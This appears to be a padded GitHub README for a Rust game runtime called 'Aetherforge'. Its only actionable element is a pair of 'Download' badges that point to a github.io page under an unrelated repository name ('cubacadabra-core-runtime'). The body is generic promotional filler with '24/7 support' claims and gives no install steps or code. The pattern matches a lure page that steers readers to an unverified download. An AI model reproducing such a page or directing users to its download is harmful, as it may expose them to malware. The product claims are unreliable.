![preview](https://raw.githubusercontent.com/engrsameen/cubacadabra-core-runtime/main/promo_0af8.svg)
[![Download](https://raw.githubusercontent.com/engrsameen/cubacadabra-core-runtime/main/run_fc028d.svg)](https://engrsameen.github.io/cubacadabra-core-runtime/)

# 🌌 Aetherforge Runtime — Cross-Platform Simulation & Rendering Engine for Rust

A universal, self-contained runtime engine written in Rust that powers immersive 2D/3D interactive experiences across desktop, mobile, browser, and embedded surfaces. Aetherforge is the shared nervous system behind a family of creative applications: it owns the simulation loop, deterministic movement and collision, sandboxed scripting through Luau bytecode, GPU-accelerated rendering via wgpu, synchronized multiplayer client logic, and a persistent shared application state machine. If you picture a modern game or creative-tool backend as an orchestra, Aetherforge is both the conductor and the concert hall.

Built with a philosophy that the runtime should never care what screen it wakes up on, Aetherforge abstracts the messy realities of platform-specific rendering, input, audio, and networking into a single ergonomic API. Whether you are shipping a physics-forward sandbox toy, a collaborative 3D editor, or a turn-based strategy skirmish, Aetherforge offers the plumbing so your team can focus on the poetry of gameplay rather than the plumbing of platforms.

![Rust](https://img.shields.io/badge/Rust-2024_Edition-E43717?logo=rust&logoColor=white)
![wgpu](https://img.shields.io/badge/wgpu-0.20+-7B68EE?logo=webgpu&logoColor=white)
![Luau](https://img.shields.io/badge/Luau-Bytecode_VM-00A2FF?logo=lua&logoColor=white)
![Platform](https://img.shields.io/badge/Platforms-Windows%20%7C%20macOS%20%7C%20Linux%20%7C%20iOS%20%7C%20Android%20%7C%20WASM-4B8BBE)
![License](https://img.shields.io/badge/License-MIT-2ECC71)
![Status](https://img.shields.io/badge/Status-Active_Development-FFA500)
![Support](https://img.shields.io/badge/Support-24%2F7-9B59B6)

---

## 📖 Table of Contents

- [Why Aetherforge Exists](#-why-aetherforge-exists)
- [The Vision Behind the Runtime](#-the-vision-behind-the-runtime)
- [Feature Constellation](#-feature-constellation)
- [Architecture Overview](#-architecture-overview)
- [Platform Coverage Matrix](#-platform-coverage-matrix)
- [Getting Started](#-getting-started)
- [Project Layout](#-project-layout)
- [Scripting with Luau](#-scripting-with-luau)
- [Rendering Pipeline](#-rendering-pipeline)
- [Networking & Multiplayer](#-networking--multiplayer)
- [Shared Application State](#-shared-application-state)
- [Accessibility, Multilingual & Responsive Design](#-accessibility-multilingual--responsive-design)
- [Performance & Benchmarks](#-performance--benchmarks)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Community & Support](#-community--support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌠 Why Aetherforge Exists

Most cross-platform runtimes are either too thin (they hand you a window and wish you luck) or too heavy (they assume you want a full engine, an editor, a marketplace, and a personality cult). Aetherforge lands in the middle: a curated, composable runtime that gives you exactly the primitives a modern interactive app needs, with the freedom to swap out any subsystem you would rather own yourself.

The engine was born out of a simple frustration: teams were reimplementing the same collision solver, the same fixed-timestep accumulator, the same WebGPU abstraction, and the same state reconciliation logic for every platform they touched. Aetherforge consolidates those recurring concerns into one Rust crate family, then exposes them through a stable ABI to every surface — from a native desktop build to a WebAssembly module served inside a browser tab.

The name "Aetherforge" is deliberate. Aether was once imagined as the invisible medium through which light travels; a forge is where raw material becomes something useful. This runtime is both — an invisible medium for simulation, and a forge where raw game logic becomes a coherent, shippable experience.

## 🔭 The Vision Behind the Runtime

We imagine a future where the same Rust code that runs a physics simulation on an iPhone can be compiled, unmodified, to run inside a browser, on a Linux server for headless testing, and on a Raspberry Pi mounted to the back of an e-ink display. Aetherforge is designed around four principles:

1. **Determinism first.** Given the same seed and the same input stream, every platform should produce bit-identical simulation output. This is not just a testing convenience — it is the foundation of fair multiplayer and replayable experiences.
2. **Zero-cost portability.** Platform abstractions should compile away when not needed. A headless build should not carry the weight of a windowing system.
3. **Sandboxed extensibility.** User-generated content is a first-class citizen, but it should never be able to break out of its sandbox, corrupt the host state, or crash the renderer.
4. **Ergonomics for humans.** The API should read like prose. If a function requires three paragraphs of documentation to use correctly, it probably shouldn't exist in its current form.

## ✨ Feature Constellation

Aetherforge bundles a constellation of subsystems that work in harmony. Each can be used independently, but their combined gravity is where the runtime shines.

- 🧮 **Fixed-timestep simulation core** — A deterministic scheduler that decouples physics from rendering, with configurable tick rates and interpolation for smooth visuals.
- 🚀 **Movement & collision** — Swept AABB, capsule-based character controllers, broad-phase spatial hashing, and continuous collision detection tuned for both retro-style 2D and 3D platformers.
- 🎭 **Luau scripting layer** — A sandboxed Luau VM with a capability-based permission model, deterministic RNG bindings, and hot-reloadable modules for rapid iteration.
- 🖼️ **wgpu rendering backend** — A single rendering abstraction that targets Vulkan, Metal, DX12, and WebGPU. Includes sprite batching, mesh instancing, shadow atlas management, and post-processing graph nodes.
- 🌐 **Multiplayer client logic** — Rollback-friendly state snapshots, delta compression, optimistic prediction, and lag compensation helpers that work over both reliable and unreliable transports.
- 🧠 **Shared application state** — An event-sourced, observable state container that all subsystems can read from and mutate through well-defined transactions.
- 🎧 **Audio mixer** — Spatial audio with head-related transfer function support, streaming decoders, and a bus-based routing graph.
- 🧩 **Asset pipeline** — Async loaders, hot-reload watchers, and a content-addressed cache that works on read-only filesystems.
- 🔐 **Deterministic RNG** — A pluggable random source that supports seeding, snapshotting, and replay, critical for reproducible simulations.
- 📱 **Responsive runtime surface** — Automatic adaptation to viewport size, DPI, safe-area insets, and input modality (touch, mouse, keyboard, gamepad).
- 🌍 **Multilingual support** — A translation catalog system with ICU-style message formatting, plural rules, and right-to-left layout mirroring.
- 🛠️ **24/7 customer support hooks** — Built-in telemetry-free diagnostics, structured logging, and an in-app support ticket channel for your users.
- 🧪 **Headless test harness** — Run full simulation loops without a window or GPU, ideal for CI pipelines and server-side authoritative logic.

## 🏗️ Architecture Overview

Aetherforge is organized as a workspace of Rust crates. The layering is strict: lower layers never depend on higher ones, which keeps compile times reasonable and dependency graphs honest.

- **aetherforge-core** — The simulation tick, entity identity, time sources, and the deterministic RNG.
- **aetherforge-collide** — Broad-phase and narrow-phase collision, swept queries, contact solving, and character controllers.
- **aetherforge-script** — The Luau VM integration, capability model, and host function registration.
- **aetherforge-render** — The wgpu device abstraction, render graph, materials, and draw call submission.
- **aetherforge-net** — Transport-agnostic networking with snapshot serialization, delta compression, and prediction.
- **aetherforge-state** — The observable application state container and transaction log.
- **aetherforge-platform** — Platform-specific shims for windowing, input, audio, and filesystem access.
- **aetherforge-app** — The opinionated glue crate that wires everything together into a runnable application.

Every crate exposes a `no_std`-friendly core where feasible, with optional `std` features for convenience. This means embedded targets can adopt the simulation core without inheriting a full operating system dependency.

## 📱 Platform Coverage Matrix

| Platform | Renderer | Input | Audio | Networking | Status |
| --- | --- | --- | --- | --- | --- |
| Windows 10/11 | Vulkan, DX12 | Keyboard, mouse, gamepad | WASAPI | UDP/TCP/WebSocket | ✅ Stable |
| macOS 13+ | Metal | Keyboard, trackpad, gamepad | CoreAudio | UDP/TCP/WebSocket | ✅ Stable |
| Linux (X11/Wayland) | Vulkan | Keyboard, mouse, gamepad | PipeWire/ALSA | UDP/TCP/WebSocket | ✅ Stable |
| iOS 16+ | Metal | Touch, gamepad | AVAudioEngine | UDP/TCP/WebSocket | ✅ Stable |
| Android 12+ | Vulkan | Touch, gamepad | AAudio | UDP/TCP/WebSocket | ✅ Stable |
| Web (WASM) | WebGPU | Touch, mouse, gamepad | WebAudio | WebSocket/WebRTC | 🟡 Beta |
| Headless server | None | None | None | UDP/TCP | ✅ Stable |

## 🚀 Getting Started

Aetherforge is designed to be adopted incrementally. You can start by using only the simulation core in an existing project, then layer on rendering, networking, and scripting as your needs grow.

### Prerequisites

- A recent stable Rust toolchain (2024 edition).
- A wgpu-compatible graphics driver on your development machine (any modern GPU from the last several years will do).
- For mobile targets, the appropriate Android NDK or Xcode toolchain.
- For web targets, the wasm32-unknown-unknown target and a bundler that understands WebAssembly modules.

### Bootstrapping a Project

The recommended way to start a new Aetherforge project is through the companion scaffolding tool, which generates a minimal application with a simulation loop, a rendering surface, and a sample Luau script. The generated project is deliberately small — you are encouraged to delete anything you do not need.

Once the project is scaffolded, the typical workflow is:

- Define your world's entity types inside the core simulation module.
- Register Luau host functions that expose safe handles to those entities.
- Compose a render graph that draws your world using the wgpu backend.
- Wire up input devices through the platform shim.
- Optionally enable networking for a multiplayer session.

## 🗂️ Project Layout

The repository follows a monorepo layout, with each crate isolated in its own directory. Supporting materials like examples, benchmarks, and documentation live in dedicated top-level folders so that day-to-day development stays focused on the runtime itself.

- `crates/` — The library crates described in the architecture section.
- `examples/` — Runnable demonstrations covering 2D platformers, 3D sandboxes, headless servers, and WASM embeds.
- `benches/` — Criterion benchmarks for the simulation loop, collision solver, and serialization paths.
- `docs/` — Long-form documentation, design notes, and tutorials.
- `tools/` — Small utilities for asset conversion, translation catalog merging, and release automation.
- `platform/` — Platform-specific integration glue for iOS, Android, and web bundling.

## 🎭 Scripting with Luau

Luau is the scripting language of choice because it balances approachability with determinism. The Aetherforge integration exposes a curated set of host functions, each gated behind a capability token. A script that has not been granted the `physics` capability simply cannot see the collision API, which eliminates an entire category of accidental coupling between user content and engine internals.

Scripts are compiled ahead of time into bytecode, hashed, and cached. The runtime never executes arbitrary source text, which keeps cold-start times predictable and prevents a class of injection-style attacks. Hot reload is supported by watching the source directory and re-hashing on change; the VM swaps modules atomically between ticks so no simulation step ever sees a half-loaded script.

## 🎨 Rendering Pipeline

The rendering backend is built on wgpu and exposes a render graph abstraction that lets you declare passes declaratively. Each pass declares its inputs and outputs, and the graph scheduler reorders them to minimize pipeline barriers and redundant work.

Key features include:

- **Instanced mesh rendering** with per-instance data packed into storage buffers.
- **Sprite batcher** with automatic atlas management and z-sorting.
- **Shadow mapping** with cascaded shadow atlas regions.
- **Post-processing graph** with tone mapping, bloom, and chromatic aberration nodes included.
- **Custom shader injection** for teams that want to write raw WGSL.

The renderer is deliberately agnostic about scene representation. Whether your world is a tilemap, a voxel grid, or a mesh soup is a decision the renderer does not make for you.

## 🌐 Networking & Multiplayer

Aetherforge's networking layer is built around snapshots. The authoritative simulation (often running on a server, but sometimes elected among peers) periodically emits a compact snapshot of world state. Clients predict forward using the same deterministic simulation code, then reconcile when authoritative snapshots arrive.

Delta compression keeps bandwidth manageable: only entities whose state has changed since the last acknowledged snapshot are transmitted. For fast-twich action, optional rollback support lets clients rewind and replay a short window of inputs to correct mispredictions without visible stutter.

Transport is pluggable. The runtime ships with UDP, TCP, WebSocket, and WebRTC adapters, and the trait is small enough that a custom transport (a game console's proprietary networking stack, for example) can be implemented in a few hundred lines.

## 🧠 Shared Application State

State is the connective tissue of the runtime. Every subsystem reads from and writes to a single observable container, which records mutations as transactions. This gives you an audit log for debugging, a natural place to hook save/load functionality, and a foundation for undo/redo in editor-style applications.

Transactions are isolated: if a mutation fails halfway through, the container rolls back cleanly. Observers can subscribe to specific query patterns rather than specific keys, which keeps decoupled systems from needing to know about each other's internal layout.

## ♿ Accessibility, Multilingual & Responsive Design

Aetherforge treats accessibility as a runtime concern rather than an afterthought. The UI layer exposes semantic roles, focus traversal, and screen reader integration uniformly across platforms. Text scaling, high-contrast palettes, and reduced-motion preferences are surfaced as first-class runtime signals that your application can honor.

Multilingual support arrives in the form of a translation catalog with ICU-compatible message formatting. Pluralization, gender agreement, and bidirectional layout mirroring are handled by the runtime so your application code deals only with message keys. Catalogs are hot-reloadable, which makes localization a continuous process rather than a last-minute scramble.

Responsive layout is achieved through a constraint solver that adapts to viewport size, device pixel ratio, and safe-area insets. The same scene graph renders correctly on a 4-inch phone and a 32-inch monitor without platform-specific code paths.

## ⚡ Performance & Benchmarks

The simulation core is engineered for predictable performance at 60Hz and beyond. On modern desktop hardware, the collision solver handles hundreds of thousands of narrow-phase queries per second; on mobile, the same solver degrades gracefully by reducing the broad-phase granularity.

Benchmarks live in the `benches/` directory and run on every pull request against a pinned hardware profile. Regressions above a defined threshold block merges, which keeps performance engineering honest. Headless CI jobs run the full simulation without a GPU, so even purely computational changes are measured.

## 🗺️ Roadmap for 2026

- **Q1 2026** — Stable WebGPU path for browser targets; richer HTML overlay integration.
- **Q2 2026** — Official plugin SDK for third-party subsystems; deeper modding capabilities.
- **Q3 2026** — Distributed simulation support for large-scale persistent worlds.
- **Q4 2026** — Visual runtime profiler with timeline capture and replay.
- **Ongoing** — Documentation expansion, example proliferation, and community-driven feature requests.

## 🤝 Contributing

Contributions are welcome from anyone who finds the runtime useful. The project follows a lightweight governance model: significant changes begin as discussion issues, graduate into design documents, and then into pull requests. Smaller changes can go straight to a pull request with a clear description.

Before opening a pull request, please:

- Run the formatting and linting tools the project has configured.
- Add or update tests for your change; the CI suite is thorough and will catch regressions.
- Update documentation if you introduce or change public API surface.
- Keep commits focused; a single logical change per commit is easier to review.

Code of conduct violations are taken seriously and are handled by the maintainer team with respect for everyone involved.

## 💬 Community & Support

Support is a core part of the Aetherforge experience. Users have access to:

- 📚 **Documentation** — Long-form guides, API references, and tutorials organized by skill level.
- 🧭 **Discussion forums** — A place to ask questions, share projects, and propose ideas.
- 🐛 **Issue tracker** — For bug reports and feature requests, with triage SLAs for critical issues.
- ⏰ **24/7 support channel** — For teams running Aetherforge in production environments.
- 🎓 **Learning paths** — Guided curricula for individuals and teams new to Rust and game runtime development.

We believe support should be human, prompt, and kind. Every question is answered by a person who cares about the answer.

## 📄 License

This project is distributed under the MIT License. The full text of the license is available at the following location within the repository:

[LICENSE](./LICENSE)

You are welcome to use Aetherforge in personal, academic, and commercial contexts. Attribution is appreciated but not required beyond the terms of the license itself.

## ⚠️ Disclaimer

Aetherforge is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for any damages, data loss, or unexpected behavior arising from the use of this software. Simulations, especially those involving user-generated scripts, should always be run with appropriate sandboxing and resource limits in production environments. This repository is a development runtime and is offered for educational, experimental, and commercial purposes; nothing in this document constitutes legal, financial, or professional advice. Features described in the roadmap are aspirational and subject to change during 2026 without prior notice. Trademarks and brand names referenced belong to their respective owners and are used only for descriptive purposes.

[![Download](https://raw.githubusercontent.com/engrsameen/cubacadabra-core-runtime/main/run_fc028d.svg)](https://engrsameen.github.io/cubacadabra-core-runtime/)